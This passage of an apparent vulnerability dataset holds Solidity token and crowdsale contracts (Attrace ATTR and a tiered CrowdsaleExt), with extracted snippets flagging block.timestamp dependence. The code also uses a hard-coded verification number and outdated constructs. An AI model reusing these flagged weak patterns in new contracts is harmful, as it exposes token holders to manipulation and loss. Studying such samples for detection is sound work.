  "content": "pragma solidity ^0.4.23;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract CappedToken is MintableToken {\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n canMint\n public\n returns (bool)\n {\n require(totalSupply_.add(_amount) <= cap);\n return super.mint(_to, _amount);\n }\n}\ncontract ATTRToken is CappedToken, DetailedERC20 {\n using SafeMath for uint256;\n uint256 public constant TOTAL_SUPPLY = uint256(1000000000);\n uint256 public constant TOTAL_SUPPLY_ACES = uint256(1000000000000000000000000000);\n uint256 public constant CROWDSALE_MAX_ACES = uint256(500000000000000000000000000);\n address public crowdsaleContract;\n uint256 public crowdsaleMinted = uint256(0);\n uint256 public releaseTime = uint256(1536278399);\n bool public fundingLowcapReached = false;\n bool public isReleased = false;\n mapping (address => bool) public agents;\n mapping (address => bool) public transferWhitelist;\n constructor() public\n CappedToken(TOTAL_SUPPLY_ACES)\n DetailedERC20(\"Attrace\", \"ATTR\", uint8(18)) {\n transferWhitelist[msg.sender] = true;\n agents[msg.sender] = true;\n }\n modifier isInitialized() {\n require(crowdsaleContract != address(0));\n require(releaseTime > 0);\n _;\n }\n function setAgent(address _address, bool _status) public onlyOwner {\n require(_address != address(0));\n agents[_address] = _status;\n }\n modifier onlyAgents() {\n require(agents[msg.sender] == true);\n _;\n }\n function setCrowdsaleContract(address _crowdsaleContract) public onlyAgents {\n require(_crowdsaleContract != address(0));\n crowdsaleContract = _crowdsaleContract;\n }\n function setTransferWhitelist(address _address, bool _canTransfer) public onlyAgents {\n require(_address != address(0));\n transferWhitelist[_address] = _canTransfer;\n }\n function setReleaseTime(uint256 _time) public onlyAgents {\n require(_time > block.timestamp);\n require(isReleased == false);\n releaseTime = _time;\n }\n function setFundingLowcapReached(uint256 _verification) public onlyAgents {\n require(_verification == uint256(20234983249), \"wrong verification code\");\n fundingLowcapReached = true;\n }\n function markReleased() public {\n if (isReleased == false && _now() > releaseTime) {\n isReleased = true;\n }\n }\n modifier hasMintPermission() {\n require(msg.sender == crowdsaleContract || agents[msg.sender] == true);\n _;\n }\n function mint(address _to, uint256 _aces) public canMint hasMintPermission returns (bool) {\n if (msg.sender == crowdsaleContract) {\n require(crowdsaleMinted.add(_aces) <= CROWDSALE_MAX_ACES);\n crowdsaleMinted = crowdsaleMinted.add(_aces);\n }\n return super.mint(_to, _aces);\n }\n modifier canTransfer(address _from) {\n if (transferWhitelist[_from] == false) {\n require(block.timestamp >= releaseTime);\n require(fundingLowcapReached == true);\n }\n _;\n }\n function transfer(address _to, uint256 _aces)\n public\n isInitialized\n canTransfer(msg.sender)\n tokensAreUnlocked(msg.sender, _aces)\n returns (bool) {\n markReleased();\n return super.transfer(_to, _aces);\n }\n function transferFrom(address _from, address _to, uint256 _aces)\n public\n isInitialized\n canTransfer(_from)\n tokensAreUnlocked(_from, _aces)\n returns (bool) {\n markReleased();\n return super.transferFrom(_from, _to, _aces);\n }\n struct VestingRule {\n uint256 aces;\n uint256 unlockTime;\n bool processed;\n }\n mapping (address => uint256) public lockedAces;\n modifier tokensAreUnlocked(address _from, uint256 _aces) {\n if (lockedAces[_from] > uint256(0)) {\n require(balanceOf(_from).sub(lockedAces[_from]) >= _aces);\n }\n _;\n }\n mapping (address => VestingRule[]) public vestingRules;\n function processVestingRules(address _address) public onlyAgents {\n _processVestingRules(_address);\n }\n function processMyVestingRules() public {\n _processVestingRules(msg.sender);\n }\n function addVestingRule(address _address, uint256 _aces, uint256 _unlockTime) public {\n require(_aces > 0);\n require(_address != address(0));\n require(_unlockTime > _now());\n if (_now() < releaseTime) {\n require(msg.sender == owner);\n } else {\n require(msg.sender == crowdsaleContract || msg.sender == owner);\n require(_now() < releaseTime.add(uint256(2592000)));\n }\n vestingRules[_address].push(VestingRule({\n aces: _aces,\n unlockTime: _unlockTime,\n processed: false\n }));\n lockedAces[_address] = lockedAces[_address].add(_aces);\n }\n function _processVestingRules(address _address) internal {\n for (uint256 i = uint256(0); i < vestingRules[_address].length; i++) {\n if (vestingRules[_address][i].processed == false && vestingRules[_address][i].unlockTime < _now()) {\n lockedAces[_address] = lockedAces[_address].sub(vestingRules[_address][i].aces);\n vestingRules[_address][i].processed = true;\n }\n }\n }\n function _now() internal view returns (uint256) {\n return block.timestamp;\n }\n}",
  "extract_feature": [
    "function setReleaseTime(uint256 _time) public onlyAgents {\nrequire(_time > block.timestamp);\nrequire(isReleased == false);\nreleaseTime = _time;\n}",
    "function _now() internal view returns (uint256) {\nreturn block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec5"
  },
  "filename": "10551.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event 